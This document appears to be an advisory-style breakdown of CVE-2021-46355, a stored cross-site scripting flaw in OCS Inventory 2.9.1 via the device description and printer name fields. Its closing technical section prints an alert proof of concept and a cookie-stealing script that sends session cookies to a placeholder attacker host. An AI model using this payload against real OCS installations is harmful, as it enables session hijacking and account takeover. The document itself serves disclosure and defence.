Based on the provided content, here's a breakdown of the vulnerability described:

**CVE ID:** CVE-2021-46355

**Root Cause of Vulnerability:**
- The vulnerability stems from a lack of proper sanitization of input data within the OCS Inventory 2.9.1 application, specifically in fields related to device names and descriptions.

**Weaknesses/Vulnerabilities Present:**
- **Stored Cross-Site Scripting (XSS):** The application does not sanitize the 'computer description' field and the 'printer name' field. This allows an attacker to inject malicious JavaScript code that is then stored in the application's database. When a user views the affected device information within OCS, the stored XSS payload is executed in their browser.

**Impact of Exploitation:**
- **Session Hijacking:** By injecting malicious Javascript, an attacker can steal user session cookies and hijack a valid user session. This allows the attacker to gain control of the user's account. The attacker would be able to perform actions with the privileges of the hijacked user.
- **Arbitrary JavaScript Execution**:  The injected script can perform any action that a normal user would be able to perform within their browser. This includes data exfiltration, account takeover, redirecting to malicious sites, etc.

**Attack Vectors:**
- **Manipulated Device Data:** Attackers can exploit this vulnerability by manipulating data reported by OCS agents when they collect data from devices on the network. Specifically, they can change the device's "computer description" or the "printer name" to include malicious JavaScript code.

**Required Attacker Capabilities/Position:**
- The attacker would need to be in a position to manipulate the device data that the OCS client collects. This could mean being an administrator of a machine that is inventoried by OCS or having access to the data stream between the client and the OCS server.
- No direct interaction is required with the OCS server, as the injection is performed via the client's data feed.
-  After successful injection, the attacker just needs a user to view the affected device info in the OCS interface in order to trigger the XSS attack.

**Technical Details:**

- The attacker can use the `<IMG SRC=x onerror=”alert(1);”>` payload to execute a simple JavaScript alert as proof of concept.
- A more harmful payload could be used to steal cookies using the payload `<script>var i=new Image;i.src=”http://YOUR_IP/?"+document.cookie;</script>`, redirecting the cookies to an attacker controlled server.
